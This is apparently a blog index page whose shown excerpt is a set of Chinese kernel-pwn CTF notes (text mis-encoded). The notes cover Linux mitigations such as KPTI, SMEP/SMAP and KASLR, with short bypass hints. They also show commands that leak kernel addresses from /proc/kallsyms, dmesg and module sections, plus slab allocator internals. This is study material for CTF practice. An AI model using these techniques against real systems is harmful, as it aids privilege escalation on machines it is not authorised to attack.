<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta property="og:type" content="website">
<meta property="og:title" content="PIG-007">
<meta property="og:url" content="http://pig-007.github.io/page/3/index.html">
<meta property="og:site_name" content="PIG-007">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="PIG-007">
<meta name="twitter:card" content="summary"><title>PIG-007</title><link ref="canonical" href="http://pig-007.github.io/page/3/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":true},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/01/14/kernel%E7%AC%94%E8%AE%B0%E6%B1%87%E6%80%BB/">kernelç¬”è®°æ±‡æ€»</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-08-20</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="ä¸€ã€å¸¸è§ä¿æŠ¤"   >
          <a href="#ä¸€ã€å¸¸è§ä¿æŠ¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€å¸¸è§ä¿æŠ¤" class="headerlink" title="ä¸€ã€å¸¸è§ä¿æŠ¤"></a>ä¸€ã€å¸¸è§ä¿æŠ¤</h1>
      
        <h2 id="1-KPTI"   >
          <a href="#1-KPTI" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-KPTI" class="headerlink" title="1.KPTI"></a>1.KPTI</h2>
      <p>åœ¨v4.15ä¹‹åä¼šé»˜è®¤å¼€å¯</p>
<p>å†…æ ¸é¡µè¡¨éš”ç¦»ï¼Œå¼€å¯ä¹‹åå¯ä»¥è®¿é—®ç”¨æˆ·ç©ºé—´å†…å­˜ï¼Œä½†æ˜¯ä¸èƒ½æ‰§è¡Œç”¨æˆ·ç©ºé—´ä»£ç </p>
<p>å³æ— æ³•ç›´æ¥é€šè¿‡æ„é€ swapgs_iretqçš„ROPæ¥è¿”å›ç”¨æˆ·æ€ï¼Œå¯å‚è€ƒç»•è¿‡</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240006#h3-2" >Linux Kernel KPTIä¿æŠ¤ç»•è¿‡ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /sys/devices/system/cpu/vulnerabilities/*</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201162023861.png" alt="image.png"></p>
<p>è¿™ä¸ªä¹Ÿæœ‰ç±»ä¼¼çš„å¯åŠ¨è„šæœ¬</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-append &quot;console=ttyS0 quiet root=/dev/sda rw init=/init oops=panic panic=1 panic_on_warn=1 kaslr pti=on&quot; \</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-SMEPã€SMAPã€KASLRç­‰"   >
          <a href="#2-SMEPã€SMAPã€KASLRç­‰" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-SMEPã€SMAPã€KASLRç­‰" class="headerlink" title="2.SMEPã€SMAPã€KASLRç­‰"></a>2.SMEPã€SMAPã€KASLRç­‰</h2>
      <p>è¿™ä¸ªç›´æ¥çœ‹å¯åŠ¨è„šæœ¬</p>

        <h3 id="1-SMEPå’ŒSMAP"   >
          <a href="#1-SMEPå’ŒSMAP" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-SMEPå’ŒSMAP" class="headerlink" title="(1)SMEPå’ŒSMAP"></a>(1)SMEPå’ŒSMAP</h3>
      <p>å¯ä»¥é€šè¿‡ROPä¿®æ”¹CR3å¯„å­˜å™¨æ¥ç»•è¿‡</p>

        <h3 id="2-KASLR"   >
          <a href="#2-KASLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-KASLR" class="headerlink" title="(2)KASLR"></a>(2)KASLR</h3>
      <p>é€šå¸¸éœ€è¦æ³„éœ²åœ°å€ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹å½“å‰åŸºåœ°å€</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms | grep startup_64</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181206238.png" alt="image-20220118120655137"></p>
<p>ä½†æ˜¯ä¹Ÿå¯ä»¥çˆ†ç ´ï¼ŒKASLRçš„éšæœºåŒ–ç¨‹åº¦åªæœ‰9bitï¼Œè¿˜æ˜¯æ¯”è¾ƒå¥½çˆ†ç ´çš„ï¼Œå‚è€ƒä¹‹åçš„çˆ†ç ´KASLRçš„æ¨¡æ¿</p>

        <h2 id="3-å…¶ä»–ä¿æŠ¤"   >
          <a href="#3-å…¶ä»–ä¿æŠ¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-å…¶ä»–ä¿æŠ¤" class="headerlink" title="3.å…¶ä»–ä¿æŠ¤"></a>3.å…¶ä»–ä¿æŠ¤</h2>
      
        <h3 id="1-STACK-PROTECTOR"   >
          <a href="#1-STACK-PROTECTOR" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-STACK-PROTECTOR" class="headerlink" title="(1)STACK PROTECTOR"></a>(1)STACK PROTECTOR</h3>
      <p>ç±»ä¼¼ç”¨æˆ·æ€çš„cancary</p>

        <h3 id="2-å‚è€ƒREADME-MD"   >
          <a href="#2-å‚è€ƒREADME-MD" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å‚è€ƒREADME-MD" class="headerlink" title="(2)å‚è€ƒREADME.MD"></a>(2)å‚è€ƒREADME.MD</h3>
      <p>æœ‰æ—¶å€™å‡ºé¢˜äººç»™çš„README.MDä¼šç»™é…ç½®</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_SLAB=y</span><br><span class="line">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED=y</span><br><span class="line">CONFIG_HARDENED_USERCOPY=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸Šå°±æ˜¯ä½¿ç”¨SLABåˆ†é…ï¼Œå¼€å¯RANDOMå’ŒHARDENEDä¿æŠ¤ï¼Œä»¥åŠHardened Usercopyï¼ˆå†…æ ¸ç©ºé—´æŒ‡é’ˆä¹Ÿä¼šè¿›è¡Œéå¸¸ä¸¥æ ¼çš„å®‰å…¨æ€§æ£€æŸ¥ï¼ŒåŒ…æ‹¬ä¸å…è®¸ä¸ºç©ºæŒ‡é’ˆã€ä¸å…è®¸æŒ‡å‘ <code>kmalloc</code> åˆ†é…çš„é›¶é•¿åº¦åŒºåŸŸã€ä¸å…è®¸æŒ‡å‘å†…æ ¸ä»£ç æ®µã€å¦‚æœæŒ‡å‘ Slab åˆ™ä¸å…è®¸è¶…è¿‡ Slab åˆ†é…å™¨åˆ†é…çš„é•¿åº¦ã€å¦‚æœæ¶‰åŠåˆ°æ ˆåˆ™ä¸å…è®¸è¶…å‡ºå½“å‰è¿›ç¨‹çš„æ ˆç©ºé—´ç­‰ç­‰ã€‚ï¼‰å’Œ <code>Static Usermodehelper Path</code>ï¼ˆmodprobe_path ä¸ºåªè¯»ï¼Œä¸å¯ä¿®æ”¹ï¼‰</p>
<p>å‚è€ƒï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/" >ã€CTF.0x05ã€‘TCTF2021-FINAL ä¸¤é“ kernel pwn é¢˜è§£ - arttnba3â€™s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="äºŒã€æ³„éœ²åœ°å€"   >
          <a href="#äºŒã€æ³„éœ²åœ°å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€æ³„éœ²åœ°å€" class="headerlink" title="äºŒã€æ³„éœ²åœ°å€"></a>äºŒã€æ³„éœ²åœ°å€</h1>
      <p>ä¸€èˆ¬æ˜¯å¼€å¯KASLRçš„æ—¶å€™å¯»æ‰¾åœ°å€</p>
<p>å‚ç…§ï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/access-control/information-disclosure/" >ä¿¡æ¯æ³„æ¼ - CTF Wiki (ctf-wiki.org)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="1-å¸¸ç”¨æ–¹æ³•"   >
          <a href="#1-å¸¸ç”¨æ–¹æ³•" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å¸¸ç”¨æ–¹æ³•" class="headerlink" title="1.å¸¸ç”¨æ–¹æ³•"></a>1.å¸¸ç”¨æ–¹æ³•</h2>
      
        <h3 id="Dmesg"   >
          <a href="#Dmesg" class="heading-link"><i class="fas fa-link"></i></a><a href="#Dmesg" class="headerlink" title="Dmesg"></a>Dmesg</h3>
      <p>æ˜¾ç¤ºå¯åŠ¨æ—¶çš„ä¸€äº›ä¿¡æ¯ï¼Œå…¶ä¸­è‚¯å®šåŒ…å«å¾ˆå¤šå‡½æ•°åœ°å€</p>
<p>å½“è®¾ç½®å¦‚ä¸‹å³ä¸èƒ½å†ç”¨</p>
<ul>
<li>å¯åŠ¨æ—¶<code>echo 1 &gt; /proc/sys/kernel/dmesg_restrict</code>ï¼Œå³è®¾ç½®<code>dmesg_restrict</code>ä¸º1</li>
<li>ç¼–è¯‘å†…æ ¸æ—¶<code>CONFIG_SECURITY_DMESG_RESTRICT=y</code>ï¼Œè¿™ä¸ªæ•ˆæœç­‰åŒ</li>
</ul>

        <h3 id="kallsyms"   >
          <a href="#kallsyms" class="heading-link"><i class="fas fa-link"></i></a><a href="#kallsyms" class="headerlink" title="kallsyms"></a>kallsyms</h3>
      <p>ä¿å­˜æ‰€æœ‰å‡½æ•°åœ°å€(å…¨å±€çš„ã€é™æ€çš„)å’Œéæ ˆæ•°æ®å˜é‡åœ°å€</p>
<p>å½“å…¶ä¸­çš„å€¼å¦‚ä¸‹æ—¶å¯¹åº”æ‰€ç¤ºæƒ…å†µï¼Œä¸€èˆ¬é¢˜ç›®å¯åŠ¨æ—¶ç›´æ¥</p>
<p><code>echo 2 &gt; /proc/sys/kernel/kptr_restrict</code></p>
<ul>
<li>0ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼Œæ²¡æœ‰ä»»ä½•é™åˆ¶ã€‚</li>
<li>1ï¼šä½¿ç”¨ <code>ï¼…pK</code> è¾“å‡ºçš„å†…æ ¸æŒ‡é’ˆåœ°å€å°†è¢«æ›¿æ¢ä¸º 0ï¼Œé™¤éç”¨æˆ·å…·æœ‰<code>CAP_ SYSLOG</code>ç‰¹æƒï¼Œå¹¶ä¸” <code>group id</code>å’ŒçœŸæ­£çš„ id ç›¸ç­‰ã€‚(è¿™ä¸ªä¸å¤ªæ‡‚ï¼Œrootç”¨æˆ·å°±å¯ä»¥çœ‹åˆ°)</li>
<li>2ï¼šä½¿ç”¨ <code>ï¼…pK</code> è¾“å‡ºçš„å†…æ ¸æŒ‡é’ˆéƒ½å°†è¢«æ›¿æ¢ä¸º 0 ï¼Œå³ä¸æƒé™æ— å…³ã€‚(rootç”¨æˆ·ä¹Ÿçœ‹ä¸åˆ°ï¼Œéœ€è¦åœ¨å¯åŠ¨æ—¶å»æ‰è¿™ä¸ªæ‰è¡Œ)</li>
</ul>

        <h3 id="module"   >
          <a href="#module" class="heading-link"><i class="fas fa-link"></i></a><a href="#module" class="headerlink" title="module"></a>module</h3>
      <p>è¿™ä¸ªæ˜¯ç”¨æ¥è·å–æ¨¡å—åŠ è½½åœ°å€çš„</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /sys/module/module_name/sections/.text</span><br></pre></td></tr></table></div></figure>

<p>ä½†æ˜¯å½“ç¼–ç¨‹æ—¶æ•…æ„å°†æ¨¡å—éšè—èµ·æ¥çš„è¯ï¼Œå°±ä¸ä¼šè¢«æŸ¥çœ‹åˆ°äº†ï¼Œä¸‹é¢æœ‰è®²åˆ°ã€‚</p>

        <h1 id="ä¸‰ã€ä¸‹è½½genericç‰ˆæœ¬å†…æ ¸"   >
          <a href="#ä¸‰ã€ä¸‹è½½genericç‰ˆæœ¬å†…æ ¸" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸‰ã€ä¸‹è½½genericç‰ˆæœ¬å†…æ ¸" class="headerlink" title="ä¸‰ã€ä¸‹è½½genericç‰ˆæœ¬å†…æ ¸"></a>ä¸‰ã€ä¸‹è½½genericç‰ˆæœ¬å†…æ ¸</h1>
      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt search linux|grep linux-image</span><br></pre></td></tr></table></div></figure>

<p>è‚¯å®šä¸å¤ªå…¨ï¼Œå½“ç„¶ä¸åŒçš„aptæºå¯¹åº”ä¸åŒçš„ï¼Œæ‰€ä»¥è¿˜æ˜¯å­¦ä¼šè‡ªå·±ç¼–è¯‘å†…æ ¸æœ€å¥½ã€‚</p>
<p>è¿™ç§æ–¹æ³•ä¸‹è½½ä¸‹æ¥æ²¡æœ‰ç¬¦å·è¡¨ï¼Œå¯ä»¥é€šè¿‡<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/marin-m/vmlinux-to-elf" >vmlinux-to-elf</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>æ¥è·å–ç¬¦å·è¡¨</p>

        <h1 id="å››ã€æ‰“å°åœ°å€"   >
          <a href="#å››ã€æ‰“å°åœ°å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#å››ã€æ‰“å°åœ°å€" class="headerlink" title="å››ã€æ‰“å°åœ°å€"></a>å››ã€æ‰“å°åœ°å€</h1>
      
        <h2 id="1-å¸¸è§„æ‰“å°"   >
          <a href="#1-å¸¸è§„æ‰“å°" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å¸¸è§„æ‰“å°" class="headerlink" title="1.å¸¸è§„æ‰“å°"></a>1.å¸¸è§„æ‰“å°</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;0x%lx\n&quot;,leakAddr);</span><br></pre></td></tr></table></div></figure>

<p>æœ‰æ—¶å€™ä¸åŠ <code>\n</code>æ‰“ä¸å‡ºæ¥</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define HEX(x) printf(&quot;[*]0x%016lx\n&quot;, (size_t)x)</span><br><span class="line">#define LOG(addr) printf(&quot;[*]%s\n&quot;, addr)</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-gdbå¼æ‰“å°"   >
          <a href="#2-gdbå¼æ‰“å°" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-gdbå¼æ‰“å°" class="headerlink" title="2.gdbå¼æ‰“å°"></a>2.gdbå¼æ‰“å°</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gdbPrint</span><span class="params">(<span class="keyword">size_t</span>* data,<span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rowLen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; len/<span class="number">0x10</span> ; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%04x\t&quot;</span>,rowLen);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%016llx  &quot;</span>,*data++);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%016llx\n&quot;</span>,*data++);</span><br><span class="line">        rowLen = rowLen+<span class="number">0x10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> data[<span class="number">0x50</span>];</span><br><span class="line"><span class="built_in">memset</span>(data,<span class="string">&#x27;\xaa&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">memset</span>(data+<span class="number">0x10</span>,<span class="string">&#x27;\xbb&#x27;</span>, <span class="number">0x20</span>);</span><br><span class="line">gdbPrint(data,<span class="number">0x50</span>);</span><br></pre></td></tr></table></div></figure>

<p>å®ç°æ•ˆæœ</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220512151331110.png" alt="image-20220512151331110"></p>

        <h2 id="3-é¢œè‰²æ‰“å°"   >
          <a href="#3-é¢œè‰²æ‰“å°" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-é¢œè‰²æ‰“å°" class="headerlink" title="3.é¢œè‰²æ‰“å°"></a>3.é¢œè‰²æ‰“å°</h2>
      
        <h1 id="äº”ã€æœç´¢å†…å­˜"   >
          <a href="#äº”ã€æœç´¢å†…å­˜" class="heading-link"><i class="fas fa-link"></i></a><a href="#äº”ã€æœç´¢å†…å­˜" class="headerlink" title="äº”ã€æœç´¢å†…å­˜"></a>äº”ã€æœç´¢å†…å­˜</h1>
      <p>å½“ä¸çŸ¥é“å†…å­˜åœ¨å“ªé‡Œæ—¶ï¼Œå¯ä»¥ä½¿ç”¨pedaçš„æœç´¢åŠŸèƒ½ï¼Œæœç´¢åœ°å€èŒƒå›´ï¼Œå¸¸å¸¸åœ¨æ“æ§æ ˆæ—¶å¾ˆå¥½ç”¨</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &quot;galf&quot; 0xffffc900001d3f80 0xffffc900001d3f98</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201141705373.png" alt="image-20220114170510292"></p>

        <h1 id="å…­ã€å¸¸è§æ¼æ´åŠåˆ©ç”¨"   >
          <a href="#å…­ã€å¸¸è§æ¼æ´åŠåˆ©ç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#å…­ã€å¸¸è§æ¼æ´åŠåˆ©ç”¨" class="headerlink" title="å…­ã€å¸¸è§æ¼æ´åŠåˆ©ç”¨"></a>å…­ã€å¸¸è§æ¼æ´åŠåˆ©ç”¨</h1>
      
        <h2 id="1-å †"   >
          <a href="#1-å †" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å †" class="headerlink" title="1.å †"></a>1.å †</h2>
      
        <h3 id="å‰ç½®çŸ¥è¯†"   >
          <a href="#å‰ç½®çŸ¥è¯†" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3>
      
        <h4 id="åˆ†é…æ–¹å¼"   >
          <a href="#åˆ†é…æ–¹å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#åˆ†é…æ–¹å¼" class="headerlink" title="åˆ†é…æ–¹å¼"></a>åˆ†é…æ–¹å¼</h4>
      <p>é€šå¸¸è€Œè¨€ä¸ºä¸¤ç§åˆ†é…æ–¹å¼SLUBæˆ–è€…SLABï¼ŒSLUBé»˜è®¤ä¼šå¸¦ä¸ŠSLABï¼Œä½†æ˜¯å¯ä»¥è¿›è¡Œè®¾ç½®ï¼Œæ¯”å¦‚åœ¨ç¼–è¯‘å†…æ ¸çš„æ—¶å€™ï¼Œä½¿ç”¨<code>CONFIG_SLUB=n</code>ï¼Œ <code>CONFIG_SLAB=y</code>è¿™æ ·ç¼–è¯‘å‡ºæ¥çš„å†…æ ¸å°±ä¸€å®šæ˜¯SLABåˆ†é…çš„äº†ã€‚</p>

        <h4 id="åˆ†é…åŸºåœ°å€"   >
          <a href="#åˆ†é…åŸºåœ°å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#åˆ†é…åŸºåœ°å€" class="headerlink" title="åˆ†é…åŸºåœ°å€"></a>åˆ†é…åŸºåœ°å€</h4>
      <p>kmalloc ä»çº¿æ€§æ˜ å°„åŒºåˆ†é…å†…å­˜ï¼Œè¿™å—åŒºåŸŸçš„çº¿æ€§åœ°å€åˆ°ç‰©ç†åœ°å€ç©ºé—´çš„æ˜ å°„æ˜¯<strong>è¿ç»­çš„</strong>ï¼Œå…¶èµ·å§‹åœ°å€ä¸º <code>page_offset_base</code>ï¼Œåœ¨ä¸å¼€å¯KASLRçš„æƒ…å†µå¦‚ä¸‹ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203251436512.png" alt="image-20220325143607447"></p>

        <h4 id="kmalloc-caches"   >
          <a href="#kmalloc-caches" class="heading-link"><i class="fas fa-link"></i></a><a href="#kmalloc-caches" class="headerlink" title="kmalloc_caches"></a>kmalloc_caches</h4>
      <p>ä½œä¸ºä¸€ä¸ª<code>kmem_cache</code>çš„ç»“æ„ä½“æ•°ç»„ï¼Œç®¡ç†ç€å¤šä¸ª<code>kmem_cache</code>ç»“æ„ä½“æŒ‡é’ˆã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131247422.png" alt="image-20220313124755307"></p>
<p>ä½†æ˜¯ä¸åŒç‰ˆæœ¬ä¸‹ï¼Œç”±äºåˆ†é…æ–¹å¼çš„ä¸åŒï¼Œå¯¼è‡´ä¹Ÿä¼š<code>kmalloc_caches</code>çš„ç»“æ„æœ‰ç‚¹å˜åŒ–</p>
<p>æ¯”å¦‚åœ¨4.19.98çš„ç‰ˆæœ¬ä¸­ï¼Œ<code>kmalloc_caches</code>å°±åªæ˜¯ä¸€ç»´æ•°ç»„</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131617711.png" alt="image-20220313161710623"></p>
<p>è€Œåœ¨5.6çš„ç‰ˆæœ¬ä¸‹ï¼Œ<code>kmalloc_caches</code>å˜æˆäº†äºŒç»´æ•°ç»„</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131617882.png" alt="image-20220313161749775"></p>
<p>å¤šå‡ºæ¥çš„ä¸¤ä¸ªä¸€ç»´ç©ºé—´ï¼Œå°±å­˜æ”¾äº†<code>kmalloc-rcl</code>å’Œ<code>dma-kmalloc</code>ï¼Œå®é™…ä¸Šä¹Ÿæ˜¯ç›¸åŒçš„</p>

        <h4 id="SLUBä¸‹"   >
          <a href="#SLUBä¸‹" class="heading-link"><i class="fas fa-link"></i></a><a href="#SLUBä¸‹" class="headerlink" title="SLUBä¸‹"></a>SLUBä¸‹</h4>
      <p>é€šå¸¸æˆ‘ä»¬åˆ†é…çš„chunkçš„<code>freelist</code>ä¸º<code>kmalloc_caches[xx].cpu_slab.freelist + CPUX_addr</code>ï¼Œä¹Ÿå°±æ˜¯å…ˆå¾—åˆ°å¯¹åº”CPUåˆ†é…çš„åŸºåœ°å€ï¼Œç„¶ååŠ ä¸Š<code>cpu_slab.freelist </code>å³ä¸ºå¯¹åº”<code>kmalloc-xx</code>çš„<code>freelist</code>çš„å®é™…åœ°å€ï¼Œå¦‚ä¸‹å›¾å¯ä»¥çœ‹åˆ°</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162018978.png" alt="image-20220316201816364"></p>
<p>è¿™é‡Œæˆ‘åœ¨itExpä¸­ç»‘å®šäº†ä½¿ç”¨CPU3è¿›è¡Œåˆ†é…</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __USE_GNU</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">cpu_set_t</span> cpu_mask;</span><br><span class="line">CPU_ZERO(&amp;cpu_mask);<span class="comment">//åˆå§‹åŒ–ä¸º0</span></span><br><span class="line">CPU_SET(<span class="number">3</span>,&amp;cpu_mask);<span class="comment">//ç»‘å®šCPU3è¿è¡Œç¨‹åº</span></span><br><span class="line">sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_mask), &amp;cpu_mask);</span><br></pre></td></tr></table></div></figure>


        <h5 id="ä¸€ç»´kmalloc-caches"   >
          <a href="#ä¸€ç»´kmalloc-caches" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ç»´kmalloc-caches" class="headerlink" title="ä¸€ç»´kmalloc_caches"></a>ä¸€ç»´kmalloc_caches</h5>
      <p><code>kmalloc_caches[1]~kmalloc_caches[13]</code>ä¸º<code>kmalloc-8</code>~`kmalloc-8k`</p>
